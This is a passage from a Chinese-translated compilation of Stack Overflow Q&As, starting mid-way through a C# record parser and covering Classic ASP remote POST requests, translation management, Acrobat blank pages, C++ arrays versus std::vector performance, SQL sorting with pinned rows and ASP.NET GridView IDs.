}
struct FILE
{
    public RECORD[] Records;
}

static FILE parseFile(string input)
{
    List<RECORD> records = new List<RECORD>();
    List<string> entries = new List<string>();
    bool escaped = false;
    bool inRecord = false;
    StringBuilder sb = new StringBuilder();
    foreach (char c in input)
    {
        switch (c)
        {
            case '|':
                if (escaped)
                {
                    sb.Append('|');
                    escaped = false;
                }
                else if (inRecord)
                {
                    entries.Add(sb.ToString());
                    sb = new StringBuilder();
                }
                else
                    throw new Exception("Invalid sequence");
                break;
            case '{':
                if (escaped)
                {
                    sb.Append('{');
                    escaped = false;
                }
                else if (inRecord)
                    throw new Exception("Invalid sequence");
                else
                {
                    inRecord = true;
                    sb = new StringBuilder();
                }
                break;
            case '}':
                if (escaped)
                {
                    sb.Append('}');
                    escaped = false;
                }
                else if (inRecord)
                {
                    inRecord = false;
                    entries.Add(sb.ToString());
                    sb = new StringBuilder();
                    records.Add(new RECORD(){Entries = entries.ToArray()});
                    entries.Clear();
                }
                else
                    throw new Exception("Invalid sequence");
                break;
            case '\\':
                if (escaped)
                {
                    sb.Append('\\');
                    escaped = false;
                }
                else if (!inRecord)
                    throw new Exception("Invalid sequence");
                else
                    escaped = true;
                break;
            default:
                if (escaped)
                    throw new Exception("Unrecognized escape sequence");
                else
                    sb.Append(c);
                break;
        }
    }
    if (inRecord)
        throw new Exception("Invalid sequence");
    return new FILE() { Records = records.ToArray() };
} 
```

# asp-classic - 如何在 Classic ASP 中将数据发布到远程 URL？

> ID：381596
> 
> 赞同：23
> 
> 时间：2008-12-19T17:20:54.153
> 
> 标签：asp-classic

我需要将`POST`数据发送到脚本中间的 url。

1.  用户填写表格：
2.  表单提交至`process.asp`：此时我需要将`POST`数据发送到第 3 方集成。
3.  `process.asp`完成并引导用户到感谢页面。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2008-12-19T18:17:18.297

当您明确说您正在使用 ASP“经典”时，我不确定为什么其他人都发布 ASP.Net 解决方案。

像这样的东西应该工作。我没有写代码；我在别处找到的。但是，如果您不想购买商业商品，则可以使用 MSXML2.ServerXMLHTTP 对象。

```
function getHTML (strUrl)
    Set xmlHttp = Server.Createobject("MSXML2.ServerXMLHTTP")
    xmlHttp.Open "GET", strUrl, False
    xmlHttp.setRequestHeader "User-Agent", "asp httprequest"
    xmlHttp.setRequestHeader "content-type", "application/x-www-form-urlencoded"
    xmlHttp.Send
    getHTML = xmlHttp.responseText
    xmlHttp.abort()
    set xmlHttp = Nothing   
end function 
```

您可能需要添加一些错误处理代码，以便在生产环境中使用。我相信如果对象收到 404 或超时错误，它会引发错误。您需要通过在 .Send 之前设置 On Error Resume Next 来“捕获”它们 ASP 风格（糟糕），然后检查 ASP 错误对象以查看是否存在问题。

祝你好运！

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-20T18:02:32.100

大多数表单操作页面都接受数据作为 POST。

```
Function postFormData(url, data)
    Dim xhr : Set xhr = Server.CreateObject("MSXML2.ServerXMLHTTP.3.0")
    xhr.open "POST", url, false
    xhr.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    xhr.send Data
    If xhr.Status = 200 Then
       postFormData = xhr.ResponseText
    Else
        Err.Raise 1001, "postFormData", "Post to " & url & " failed with " & xhr.Status
    End If
End Function 
```

创建数据时需要对数据值进行 url 编码。由于 ASPs Server.URLEncode 方法只进行路径编码而不是组件编码，因此您需要用 %2F 替换掉 / 字符

```
Function URLEncodeComponent(value)
    URLEncodeComponent = Server.URLEncode(value)
    URLEncodeComponent = Replace(URLEncodeComponent, "/", "%2F")
End Function 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-19T17:26:59.007

在 .Net 中，它是 System.Net.WebClient 或 System.Net.HttpWebRequest。

经典 ASP 有一个完全不同的 api——我不确定你会在那里使用什么。

[编辑]
我怀疑*如果*经典 asp 对此有任何内置支持，它位于脚本对象中，如下所示：`CreateObject("Scripting.????")`

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-19T17:28:32.793

如果你被 ASP 类卡住了，你可以在这里使用商业 ASPHTTP 库：

[http://www.serverobjects.com/comp/asphttp3.htm](http://www.serverobjects.com/comp/asphttp3.htm)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-19T17:31:32.803

在 ASP.NET 中，这非常简单：

```
HttpWebRequest r =
  (HttpWebRequest)WebRequest.Create("http://www.google.com");
r.Method = "POST";
using (Stream stream = myRequest.GetRequestStream()) {
    // Write data to stream
}
WebResponse resp = r.GetResponse();
// Do soemthing with the resp 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2011-04-19T03:37:01.323

好的，所有答案都非常复杂，我知道您已经选择了一个解决方案 - 但我觉得简单的*Server.Transfer()*命令可以完全满足您的需求。

在脚本的末尾，而不是 Response.Redirect(url) 到新页面 - 只需执行 Server.Transfer(url) ，它就会将您的整个请求集合传递到下一页。

[在此处](http://support.microsoft.com/kb/219294)阅读(support.microsoft.com)。

有一些问题（即它在浏览器上保持相同的 URL，因此它可以使用后退按钮等来玩花样），但除此之外它非常简单。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-19T17:36:15.667

使用此处描述的类。这是一个很好的方法，我一直在使用它：

[http://www.jigar.net/articles/viewhtmlcontent78.aspx](http://www.jigar.net/articles/viewhtmlcontent78.aspx)

```
public class  RemotePost{
     private  System.Collections.Specialized.NameValueCollection Inputs 
     = new  System.Collections.Specialized.NameValueCollection() ;

    public string  Url  =  "" ;
    public string  Method  =  "post" ;
    public string  FormName  =  "form1" ;

    public void  Add( string  name, string value ){
        Inputs.Add(name, value ) ;
     }

     public void  Post(){
        System.Web.HttpContext.Current.Response.Clear() ;

         System.Web.HttpContext.Current.Response.Write( "<html><head>" ) ;

         System.Web.HttpContext.Current.Response.Write( string .Format( "</head><body onload=\"document.{0}.submit()\">" ,FormName)) ;

         System.Web.HttpContext.Current.Response.Write( string .Format( "<form name=\"{0}\" method=\"{1}\" action=\"{2}\" >" ,

        FormName,Method,Url)) ;
            for ( int  i = 0 ; i< Inputs.Keys.Count ; i++){
            System.Web.HttpContext.Current.Response.Write( string .Format( "<input name=\"{0}\" type=\"hidden\" value=\"{1}\">" ,Inputs.Keys[i],Inputs[Inputs.Keys[i]])) ;
         }
        System.Web.HttpContext.Current.Response.Write( "</form>" ) ;
         System.Web.HttpContext.Current.Response.Write( "</body></html>" ) ;
         System.Web.HttpContext.Current.Response.End() ;
     }
} 
```

像这样使用它：

```
RemotePost myremotepost  =  new  RemotePost() ;
myremotepost.Url  =  "http://www.jigar.net/demo/HttpRequestDemoServer.aspx" ;
myremotepost.Add( "field1" , "Huckleberry" ) ;
myremotepost.Add( "field2" , "Finn" ) ;
myremotepost.Post() ; 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2008-12-19T17:34:44.483

你可以通过很多方式做到这一点。和 `WebClient`

```
 WebClient Client = new WebClient ();
 Client.DownloadFile("http://www.stackoverflow.com/myfile.html", "myfile.html"); 
```

或者您可以将数据放入流中以在程序中使用它：

```
WebClient Client = new WebClient ();
Stream strm = Client.OpenRead ("http://www.stackoverflow.com/myfile.htm"); 
```

但我更喜欢使用`HttpWebRequest`：

```
HttpWebRequest objRequest = (HttpWebRequest)WebRequest.Create("http://www.stackoverflow.com/myfile.html");
StreamWriter myWriter = new StreamWriter(objRequest.GetRequestStream()); 
```

我更喜欢第二个，因为您可以为 POST/GET 或 Cookie 提供更多选择。

# internationalization - 在项目中管理多种语言的好解决方案

> ID：381609
> 
> 赞同：3
> 
> 时间：2008-12-19T17:25:47.450
> 
> 标签：internationalization

我们需要为我们的应用程序管理大量（大约 20 多种）语言。对于需要较少语言 (3 - 4) 的先前项目，我们使用了一个简单的 Excel 电子表格，我们将其发送给各种翻译人员，他们填写了字符串的翻译。有了这么多语言并且需要涉及多个翻译人员，是否有更好的解决方案来管理这些数据？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-19T17:51:47.193

是的。如果您要达到国际化的范围，我建议您在数据库中跟踪您的字符串和语言，并制作一个小型 Web 应用程序来编辑它们。然后您可以将翻译人员发送到特定于其语言的编辑界面，处理并发（不必担心“谁拥有文件”，这将成为您当前方法中的一个大问题），否则会使生活更轻松.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T19:38:40.380

如果我们在这里谈论.NET 应用程序...那么，由于静态字符串将在资源文件中，您应该使用某种资源文件生成器。周围有不少。目前我只处理 3 种语言，并且发现[Globalizer.NET](http://www.infralution.com/globalizer.html)是一个相当不错的语言，但还有更多的接口略有不同。

它们通常以两种形式获得许可，一种供开发人员使用（生成本地化程序集或 resx 源代码），另一种供翻译人员使用（将翻译字符串存储到内部数据库或从内部数据库存储翻译字符串）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-30T21:09:26.567

您可以尝试使用[Pootle](http://translate.sourceforge.net/wiki/pootle/index)。有助于管理翻译过程的开源网络应用程序。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2008-12-19T17:39:44.130

并不真地。

将其保存为 CSV 并自动创建已翻译的文本资源文件。

# pdf - 某些 Acrobat 版本中的空白页

> ID：381616
> 
> 赞同：0
> 
> 时间：2008-12-19T17:27:59.910
> 
> 标签：pdf, pdf-generation, acrobat

我有一个使用 HTMLDOC 从 HTML 源生成的 PDF。虽然我可以在我的 Mac 上以及在我可以使用的每个 Acrobot 版本上正常查看文件，但一些最终用户将某些页面显示为完全空白。

空白页有些独特，因为它们确实包含图像，但我不明白为什么这会影响输出。

Adobe Reader 是否存在任何可能导致此问题的已知错误？

编辑：通过这个挖掘，从记录的副本中获取原件，虽然它对我有用，但我仍然有客户抱怨。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-27T01:24:54.130

我的猜测是文件中的字体不在客户端的机器上。字体是否嵌入？如果没有，那将是我要尝试的第一件事。它会使您的 PDF 更大，但应该可以解决问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-03-14T11:00:09.667

我也遇到过这个....打开PDF balank页面后显示。但是在我滚动到下一页并返回后，会显示文本。

# c++ - 在 C++ 中使用数组或 std::vectors，性能差距是什么？

> ID：381621
> 
> 赞同：242
> 
> 时间：2008-12-19T17:30:26.817
> 
> 标签：c++, arrays, vector

在我们的 C++ 课程中，他们建议不要再在新项目中使用 C++ 数组。据我所知，Stroustroup 本人建议不要使用数组。但是有显着的性能差异吗？

* * *

## 回答 #1

> 赞同：211
> 
> 时间：2008-12-19T17:41:03.127

应避免将 C++ 数组与`new`（即使用动态数组）一起使用。有一个问题是您必须跟踪大小，您需要手动删除它们并进行各种整理。

也不鼓励在堆栈上使用数组，因为您没有范围检查，并且传递数组将丢失有关其大小的任何信息（数组到指针的转换）。在这种情况下，您应该使用`boost::array`它，它将 C++ 数组包装在一个小类中，并提供一个`size`函数和迭代器来迭代它。

现在**std::vector 与本机 C++ 数组**（取自互联网）：

```
// Comparison of assembly code generated for basic indexing, dereferencing, 
// and increment operations on vectors and arrays/pointers.

// Assembly code was generated by gcc 4.1.0 invoked with  g++ -O3 -S  on a 
// x86_64-suse-linux machine.

#include <vector>

struct S
{
  int padding;

  std::vector<int> v;
  int * p;
  std::vector<int>::iterator i;
};

int pointer_index (S & s) { return s.p[3]; }
  // movq    32(%rdi), %rax
  // movl    12(%rax), %eax
  // ret

int vector_index (S & s) { return s.v[3]; }
  // movq    8(%rdi), %rax
  // movl    12(%rax), %eax
  // ret

// Conclusion: Indexing a vector is the same damn thing as indexing a pointer.

int pointer_deref (S & s) { return *s.p; }
  // movq    32(%rdi), %rax
  // movl    (%rax), %eax
  // ret

int iterator_deref (S & s) { return *s.i; }
  // movq    40(%rdi), %rax
  // movl    (%rax), %eax
  // ret

// Conclusion: Dereferencing a vector iterator is the same damn thing 
// as dereferencing a pointer.

void pointer_increment (S & s) { ++s.p; }
  // addq    $4, 32(%rdi)
  // ret

void iterator_increment (S & s) { ++s.i; }
  // addq    $4, 40(%rdi)
  // ret

// Conclusion: Incrementing a vector iterator is the same damn thing as 
// incrementing a pointer. 
```

注意：如果您分配数组`new`并分配非类对象（如 plain `int`）或没有用户定义构造函数的类*，并且*您不希望最初初始化元素，则使用`new`-allocated 数组可能具有性能优势，因为`std::vector`将所有元素初始化为构造的默认值（例如，0 表示 int）（感谢@bernie 提醒我）。

* * *

## 回答 #2

> 赞同：89
> 
> 时间：2008-12-20T17:35:54.963

## 微优化人员的序言

记住：

> “程序员会浪费大量时间去思考或担心程序中非关键部分的速度，而在考虑调试和维护时，这些提高效率的尝试实际上会产生强烈的负面影响。我们应该忘记小的效率，比如97% 的时间：**过早的优化是万恶之源。**但我们不应该放弃那关键的 3% 的机会”。

（感谢[变形金刚](https://stackoverflow.com/users/3454889/metamorphosis)的完整报价）

不要仅仅因为您认为它更快，因为它应该是较低级别的，就使用 C 数组而不是向量（或其他）。你会错的。

使用默认向量（或适合您需要的安全容器），然后如果您的分析器说这是一个问题，请查看您是否可以通过使用更好的算法或更改容器来优化它。

这就是说，我们可以回到最初的问题。

## 静态/动态数组？

C++ 数组类比低级 C 数组表现得更好，因为它们对自己了解很多，并且可以回答 C 数组无法回答的问题。他们能够自己清洁。更重要的是，它们通常是使用模板和/或内联编写的，这意味着在调试中出现的大量代码解析为在发布构建中生成的代码很少或没有，这意味着与它们内置的不太安全的竞争没有区别。

总而言之，它分为两类：

### 动态数组

使用指向 malloc-ed/new-ed 数组的指针充其量与 std::vector 版本一样快，而且安全性要低得多（请参阅[litb 的帖子](https://stackoverflow.com/questions/381621/using-arrays-or-stdvectors-in-c-whats-the-performance-gap#381656)）。

所以使用 std::vector。

### 静态数组

最好使用静态数组：

*   [与std::array](http://en.cppreference.com/w/cpp/container/array)版本一样快
*   而且安全性要低得多。

所以使用[std::array](http://en.cppreference.com/w/cpp/container/array)。

### 未初始化的内存

有时，使用 a`vector`而不是原始缓冲区会产生可见的成本，因为`vector`它将在构造时初始化缓冲区，而它替换的代码没有，正如[bernie](https://stackoverflow.com/users/1030527/bernie)在他的[回答](https://stackoverflow.com/a/43955169/14089)中所说。

如果是这种情况，那么您可以使用 a`unique_ptr`而不是 a来处理它，`vector`或者，如果在您的代码行中这种情况并非例外，则实际编写一个`buffer_owner`将拥有该内存的类，并让您轻松安全地访问它，包括像调整它的大小（使用`realloc`？）或任何你需要的奖金。

* * *

## 回答 #3

> 赞同：35
> 
> 时间：2008-12-19T18:17:54.753

向量是引擎盖下的数组。性能是一样的。

您可能会遇到性能问题的一个地方是一开始​​就没有正确调整向量的大小。

当一个向量被填满时，它会调整自己的大小，这可能意味着一个新的数组分配，然后是 n 个复制构造函数，然后是大约 n 个析构函数调用，然后是数组删除。

如果您的构造/破坏很昂贵，那么最好使向量一开始就具有正确的大小。

有一种简单的方法可以证明这一点。创建一个简单的类，显示它何时被构造/销毁/复制/分配。创建这些东西的向量，并开始将它们推到向量的后端。当向量填满时，随着向量调整大小，将会有一系列活动。然后使用大小为预期元素数量的向量再次尝试。你会看到不同之处。

* * *

## 回答 #4

> 赞同：31
> 
> 时间：2008-12-19T17:47:43.210

回应[Mehrdad](https://stackoverflow.com/questions/381621/using-arrays-or-stdvectors-in-c-whats-the-performance-gap#381646)所说的话：

> 但是，在某些情况下您仍然需要数组。在与需要数组的低级代码（即程序集）或旧库交互时，您可能无法使用向量。

一点也不真实。如果您使用，向量会很好地降级为数组/指针：

```
vector<double> vector;
vector.push_back(42);

double *array = &(*vector.begin());

// pass the array to whatever low-level code you have 
```

这适用于所有主要的 STL 实现。在下一个标准中，它将被要求工作（即使它今天做得很好）。

* * *

## 回答 #5

> 赞同：19
> 
> 时间：2013-10-29T13:22:48.807

在 C++11 中使用普通数组的理由更少。

自然界中有 3 种数组，从最快到最慢，取决于它们所具有的特性（当然，即使对于列表中的案例 3，实现的质量也可以使事情变得非常快）：

1.  静态的，在编译时已知大小。---`std::array<T, N>`
2.  动态的，大小在运行时已知并且从不调整大小。这里的典型优化是，如果数组可以直接在堆栈中分配。-**不可用**。也许`dynarray`在 C++14 之后的 C++ TS 中。在 C 中有 VLA
3.  在运行时动态和可调整大小。---`std::vector<T>`

**1.**对于元素个数固定的普通静态数组，`std::array<T, N>`在C++11中使用。

**2.**对于在运行时指定的固定大小的数组，但不会改变它们的大小，在 C++14 中有讨论，但它已移至技术规范并最终由 C++14 制成。

**3.** 通常会在`std::vector<T>` **堆中请求内存**。尽管您可以使用`std::vector<T, MyAlloc<T>>`自定义分配器来改善这种情况，但这可能会对性能产生影响。与之相比的优点`T mytype[] = new MyType[n];`是您可以调整它的大小并且它不会像普通数组那样衰减为指针。

使用提到的标准库类型来避免 [数组衰减为指针](http://www.lysator.liu.se/c/c-faq/c-2.html)。如果您使用相同的一组功能，您将节省调试时间，并且性能与普通数组完全相同**。**

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2017-05-13T16:00:56.420

*当您想要一个未初始化*的缓冲区（例如用作 的目标）时，使用`std::vector`原始数组肯定会对性能产生影响。An将使用默认构造函数初始化其所有元素。原始数组不会。*`memcpy()``std::vector`*

 *带有参数的构造函数的[c++ 规范](http://en.cppreference.com/w/cpp/container/vector/vector)（它是第三种形式）指出：`std:vector``count`

> `从各种数据源构造一个新容器，可选择使用用户提供的分配器 alloc。

> 3.  使用默认插入的计数 T 实例构造容器。不制作副本。

> **复杂**

> 2-3) 计数线性

原始数组不会产生这种初始化成本。

请注意，使用自定义分配器，可以避免向量元素的“初始化”（即使用默认初始化而不是值初始化）。有关更多详细信息，请参阅这些问题：

*   [C++11 和 Boost.Container 下 vector::resize(size_type n) 的这种行为是否正确？](https://stackoverflow.com/questions/21028299/is-this-behavior-of-vectorresizesize-type-n-under-c11-and-boost-container/21028912#21028912)
*   [如何避免 std::vector<> 初始化其所有元素？](https://stackoverflow.com/questions/5958572/how-can-i-avoid-stdvector-to-initialize-all-its-elements)

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2008-12-19T17:41:51.347

使用 STL。没有性能损失。这些算法非常有效，它们在处理我们大多数人不会想到的各种细节方面做得很好。

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2008-12-19T17:37:29.937

STL 是一个高度优化的库。事实上，甚至建议在可能需要高性能的游戏中使用 STL。数组太容易出错，无法在日常任务中使用。今天的编译器也很聪明，真的可以用 STL 生成优秀的代码。如果您知道自己在做什么，STL 通常可以提供必要的性能。例如，通过将向量初始化为所需的大小（如果您从一开始就知道），您基本上可以实现数组性能。但是，在某些情况下您仍然需要数组。在与需要数组的低级代码（即程序集）或旧库交互时，您可能无法使用向量。

* * *

## 回答 #9

> 赞同：6
> 
> 时间：2012-04-19T17:12:24.993

[关于杜力的贡献](http://www.cplusplus.com/forum/general/68730/)，用我自己的测量。

结论是整数数组比整数向量快（在我的例子中是 5 倍）。但是，对于更复杂/未对齐的数据，数组和向量的速度相同。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2008-12-19T20:04:35.383

如果在调试模式下编译软件，许多编译器不会内联向量的访问器函数。在性能有问题的情况下，这将使 stl 向量实现更慢。它还将使代码更易于调试，因为您可以在调试器中看到分配了多少内存。

在优化模式下，我希望 stl 向量接近数组的效率。这是因为许多向量方法现在是内联的。

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2008-12-19T17:45:09.580

两者之间的性能差异在很大程度上取决于实现——如果你将一个糟糕实现的 std::vector 与一个最佳数组实现进行比较，那么数组会赢，但是把它转过来，向量就会赢……

只要您将苹果与苹果进行比较（数组和向量都有固定数量的元素，或者都动态调整大小），只要您遵循 STL 编码实践，我认为性能差异可以忽略不计。不要忘记，使用标准 C++ 容器还允许您使用作为标准 C++ 库一部分的预滚动算法，并且它们中的大多数可能比您自己构建的相同算法的平均实现性能更好.

也就是说，恕我直言，向量在带有调试 STL 的调试场景中获胜，因为大多数具有适当调试模式的 STL 实现至少可以突出/概括人们在使用标准容器时所犯的典型错误。

哦，别忘了数组和向量共享相同的内存布局，因此您可以使用向量将数据传递给需要基本数组的遗留 C 或 C++ 代码。但请记住，在这种情况下，大多数赌注都失败了，而且您又要处理原始内存了。

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2019-03-03T21:58:59.280

如果您使用向量来表示多维行为，则会影响性能。

[2d+ 向量会导致性能下降吗？](https://stackoverflow.com/questions/54973981/do-2d-vectors-cause-a-performance-hit?noredirect=1#comment96707133_54973981)

要点是每个具有大小信息的子向量都有少量开销，并且不一定会有数据序列化（就像多维 c 数组一样）。这种缺乏序列化可以提供比微优化更多的机会。如果你在做多维数组，最好只扩展 std::vector 并滚动你自己的 get/set/resize bits 函数。

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2008-12-19T17:41:36.700

如果不需要动态调整大小，则有保存容量的内存开销（一个指针/size_t）。就是这样。

* * *

## 回答 #14

> 赞同：1
> 
> 时间：2008-12-19T18:04:48.650

可能存在一些边缘情况，您可以在内联函数内的内联函数内进行向量访问，在这种情况下，您已经超出了编译器将内联的内容，它将强制执行函数调用。那将是如此罕见，以至于不值得担心-总的来说，我同意[litb](https://stackoverflow.com/questions/381621/using-arrays-or-stdvectors-in-c-whats-the-performance-gap#381656)。

我很惊讶还没有人提到这一点——在它被证明是一个问题之前不要担心性能，然后再进行基准测试。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2008-12-19T18:07:53.713

有时数组确实比向量好。如果您总是在操作一组固定长度的对象，那么数组会更好。考虑以下代码片段：

```
int main() {
int v[3];
v[0]=1; v[1]=2;v[2]=3;
int sum;
int starttime=time(NULL);
cout << starttime << endl;
for (int i=0;i<50000;i++)
for (int j=0;j<10000;j++) {
X x(v);
sum+=x.first();
}
int endtime=time(NULL);
cout << endtime << endl;
cout << endtime - starttime << endl;

} 
```

其中 X 的向量版本是

```
class X {
vector<int> vec;
public:
X(const vector<int>& v) {vec = v;}
int first() { return vec[0];}
}; 
```

X 的数组版本是：

```
class X {
int f[3];

public:
X(int a[]) {f[0]=a[0]; f[1]=a[1];f[2]=a[2];}
int first() { return f[0];}
}; 
```

main() 的数组版本会更快，因为我们在内部循环中避免了每次“new”的开销。

（此代码由我发布到 comp.lang.c++）。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2008-12-19T18:08:16.303

我认为主要关注的不是性能，而是安全性。您可能会在使用数组时犯很多错误（例如，考虑调整大小），而向量会为您省去很多麻烦。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2009-05-11T21:37:02.603

向量使用的内存比数组多一点，因为它们包含数组的大小。它们还增加了程序的硬盘大小，可能还会增加程序的内存占用。这些增加很小，但如果您使用的是嵌入式系统，则可能很重要。尽管这些差异很重要的大多数地方都是您将使用 C 而不是 C++ 的地方。

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2013-04-14T06:31:00.893

以下简单测试：

[C++ Array vs Vector 性能测试说明](https://stackoverflow.com/questions/10887668/c-array-vs-vector-performance-test-explanation)

与“为向量和数组/指针的基本索引、取消引用和递增操作生成的汇编代码的比较”的结论相矛盾。

数组和向量之间必须有区别。测试说是这样……试试吧，代码就在那里……

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2021-03-25T07:11:51.440

对于固定长度数组，发布版本中的性能是相同的（与 vector<> 相比），但在调试版本中，根据我的经验（MS Visual Studio 2015，C++ 11），低级数组的优势是 20 倍。

因此，如果您（或您的同事）倾向于在您的数组使用中引入错误，那么支持 STL 的“节省时间调试”论点可能是有效的，但如果您的调试时间主要是在等待您的代码运行到您所需要的时间，则可能不是目前正在努力，以便您可以逐步完成它。

从事数字密集型代码的经验丰富的开发人员有时会属于第二组（尤其是如果他们使用向量 :)）。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2018-12-07T20:18:42.553

假设一个固定长度的数组（例如`int* v = new int[1000];`vs `std::vector<int> v(1000);`，大小`v`固定为 1000），唯一真正重要的性能考虑（或者至少在我处于类似困境时对我很重要）是访问元素。我查找了 STL 的矢量代码，发现如下：

```
const_reference
operator[](size_type __n) const
{ return *(this->_M_impl._M_start + __n); } 
```

这个函数肯定会被编译器内联。因此，只要您计划做的唯一事情`v`是使用 访问其元素`operator[]`，那么性能似乎应该没有任何差异。

# .net - 如何对 SQL 结果进行排序但保留一些特殊结果？

> ID：381622
> 
> 赞同：4
> 
> 时间：2008-12-19T17:30:37.423
> 
> 标签：.net, sql, sorting

我有一个 SQL 查询的结果，我想按字母顺序排序，但是有几个常用的结果我想浮动到顶部。有没有一种简单的方法可以通过执行巧妙的 SQL 或在填充后对（asp.net）数据表进行排序来实现这一点？

我知道我想提前保留在顶部的东西的数据库 ID，如果这有影响的话。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-12-19T17:35:31.843

最简单的方法是按将这些字段与其他字段分开的东西进行排序......

假设您有权修改表格的结构（您可能没有），然后添加一个“粘性”字段，允许您将项目标记为粘性并根据需要将订单附加到粘性项目。在常规排序之前按此字段排序。

至于在没有定义该字段的情况下执行此操作的技巧 - 您需要按可以在这些字段中找到的一些数据进行排序，或者在单独的表中维护 id - 或查询中的列表......这不是最理想的方式，但它会工作。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-12-19T17:34:44.827

您可以定义一个自定义列来设置您可以排序的“特殊标志”。然后，按字母列排序。

```
SELECT ...
    IsSpecial = CASE WHEN RowID IN (100,534,203) THEN 1 ELSE 0 END
FROM ...
ORDER BY IsSpecial DESC, RowID ASC, Name ASC 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-12-19T17:48:28.603

只需按使用您指定的任何规则的案例语句进行排序...

```
 ...
   Order By Case 
      When [My Rules that designate special] 
       Then 0 Else 1 End 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2008-12-19T17:32:43.597

您可以添加一个名为“特殊”的附加字段。Special 不一定必须实际存在于表中，您可以根据您认为合适的方式从查询中派生它。然后排序如下：

```
ORDER BY Special DESC, Name ASC 
```

这当然假设您的非特殊行为 0，并且字母字段称为“名称”

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-19T17:37:12.277

添加到@EndangeredMassa：

如果你已经在做联合，你也可以做类似的事情：

```
SELECT 0 QueryType, Desc, GrandTotal
FROM YourTable

UNION ALL

SELECT 1 QueryType, Desc, LineItems
FROM YourTable

ORDER BY QueryType, Desc 
```

注意：在这个例子中，联合可能并不理想……这只是一个例子！

# c# - 对于设计模式的 c# 片段，是否有任何好的框架或库？

> ID：381642
> 
> 赞同：0
> 
> 时间：2008-12-19T17:37:10.780
> 
> 标签：c#, design-patterns

我们想为 .NET构建一个 c# *snips库。*我们正在四处寻找是否有类似的东西。该库将是开源的，可以免费使用和分发。

我看到这里有一个类似的问题，但理论多于实际，我想拥有[Good Source of .NET Dsg Patterns](https://stackoverflow.com/questions/324824/good-source-of-net-design-patterns)。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-19T17:40:24.953

如果有图书馆，我们为什么还要为这种模式烦恼？我们只会使用 lib 并陷入成功的陷阱。

该模式的想法是不要犯与其他数千名开发人员相同的错误。该模式类似于“如果您需要以这种方式构建某些东西，那么这种方式效果最好”。每个人都知道我在说“策略或工厂等”时在说什么

如我错了请纠正我...

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-19T17:44:31.170

Doodads 在他们的网站上有很多 C# 示例

[这是 C# 中 GOF 模式实现的列表](http://dofactory.com/Patterns/Patterns.aspx)

他们还有一个用于 GOF 模式的“设计模式框架”，它是商业的。很久以前买的，可以参考。

[http://dofactory.com/Framework/Framework.aspx](http://dofactory.com/Framework/Framework.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-20T04:05:35.427

*   [Lokad 共享库](http://rabdullin.com/shared-libraries/)- 我不喜欢[企业库](http://www.codeplex.com/entlib)不必要的复杂性和不灵活，所以我改用这些帮助程序和模式
*   [Misc Util](http://www.yoda.arachsys.com/csharp/miscutil/) - .NET 的杂项助手
*   [NetFX](http://code.google.com/p/netfx/) - .NET 的杂项助手

# c# - Gridview HTML 行 ID 错误地创建

> ID：381659
> 
> 赞同：0
> 
> 时间：2008-12-19T17:41:44.080
> 
> 标签：c#, asp.net, gridview

全部，

当我的gridview 绑定到它的数据源（以编程方式设置）并生成HTML 时，行ID 在HTML 中的出现对于每一行都是相同的......即它们不是唯一的。我期望这个：

```
<select name="ctl00$ContentHolder$list$ctl03$EquipmentTypeList" id="ctl00_ContentHolder_list_ctl03_EquipmentTypeList" style="width:160px;"> 
```

即 id 包含 ctl03 以唯一标识一行......但是......当我使用用户控件代替标准下拉列表时，我得到了这个：

```
<select name="ctl00$ContentHolder$flbShipFrom$ddlAvailableOptions" onchange="StoreSelection('ctl00_ContentHolder_flbShipFrom_ddlAvailableOptions'); setTimeout('__doPostBack(\'ctl00$ContentHolder$flbShipFrom$ddlAvailableOptions\',\'\')', 0)"  id="ctl00_ContentHolder_flbShipFrom_ddlAvailableOptions" style="width:283px;" /> 
```

即 ID 不包含唯一的行号。这也发生在同一行的标准 .NET 控件中：

每当我尝试通过 ID 访问数据时，我都会得到错误的信息，而且它还显示，gridview 的视图状态没有正确重新生成，因为文本框等在页面重新提交时丢失了值。

完全卡住了......请有任何建议

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-28T02:36:33.563

确保你用来生成行的任何东西都实现了 INamingContainer。

关于 ViewState 问题，它可能是这种情况的症状，也可能是您生成行的方式。如果命名容器没有帮助，请发布您的服务器端代码。

另外，尽量避免直接使用客户端ID？在大多数情况下，如果您确实需要精确控制，您可以使用 FindControl（服务器端）或将 ClientID 的结果传递给您的 Javascript（客户端）。通常，最好不要直接引用 HTML ID，尤其是因为您已经发现了嵌套命名问题。

# language-agnostic - 为什么我有时会听到“词法变量”这个词？

> ID：381661
> 
> 赞同：6
> 
